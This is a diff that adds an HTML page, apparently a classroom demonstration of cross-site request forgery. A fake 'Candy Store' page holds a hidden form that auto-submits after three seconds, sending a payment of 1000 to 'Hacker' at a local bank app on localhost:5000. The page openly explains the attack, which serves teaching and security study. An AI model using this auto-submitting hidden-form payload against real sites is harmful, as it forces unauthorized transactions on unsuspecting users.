@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hacker</title>
+    <script src="http://code.jquery.com/jquery-latest.js"></script>
+    <script>
+      setTimeout(function() {
+        $('#send_payment').submit();
+      }, 3000);
+    </script>
+  </head>
+  <body>
+    <h1>Candy Store</h1>
+    <p>Look lots of candy ... very innocent.  But in 3 seconds it's going to do a CSRF attack on
+    the bank.  View the page source to see how.</p>
+    <div style="display: none">
+      <form name="send_payment" id="send_payment" method="POST" action="http://localhost:5000/send_payment/">
+        <input name="recipient" value="Hacker" />
+        <input name="amount" value="1000" />
+      </form>
+    </div>
+  </body>
+</html> 
